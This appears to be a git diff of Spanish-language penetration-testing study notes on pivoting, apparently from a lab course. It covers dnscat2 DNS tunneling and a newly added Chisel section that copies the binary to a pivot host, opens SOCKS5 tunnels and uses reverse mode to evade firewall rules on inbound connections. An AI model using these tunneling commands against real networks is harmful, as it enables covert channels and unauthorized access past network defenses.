@@ -122,6 +122,7 @@ dnscat2 es un tool para tunneling usando DNS. Hace que el target utilice un serv
 ##LINUX
 git clone https://github.com/iagox86/dnscat2.git
 #Link de dnscat2
+
 cd dnscat2/server/
 gem install bundler
 bundle install
@@ -144,3 +145,36 @@ Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecre
 
 dnscat2> window -i nro
 #Una vez ejecutado el otro comando, se crea una sesion. Reemplazar el nro por el nro de la sesion
+
+
+
+	#### HTTP
+	### Chisel
+Chisel es un tool para tunneling que usa http para transportar data mediante SSH
+
+git clone https://github.com/jpillora/chisel.git
+#Tool
+
+cd chisel
+go build
+#Instalar
+
+scp chisel ubuntu@10.129.202.64:~/
+#Enviamos el binario creado por ssh al host pivot
+
+./chisel server -v -p 1234 --socks5
+#Se pone en escucha en el puerto 1234 (en este caso) para enviar las conexiones a todos los host a los que el pivote llegue
+
+./chisel client -v 10.129.202.64:1234 socks
+#De esta forma nos conectammos al pivote:port
+
+socks5 127.0.0.1 1080
+#Agregando esto a proxychains.conf (y comentando la entradaa tor) nos permite podes usar proxychains con chisel
+
+En el caso de que reglas de firewall evite conexiones entrantes al pivote podemos usar laa opcion --reverse
+
+sudo ./chisel server --reverse -v -p 1234 --socks5
+#Con esta flag evitamos es regla
+
+./chisel client -v 10.10.14.17:1234 R:socks
+#Configuramos el cliente con la R para setear el reverse
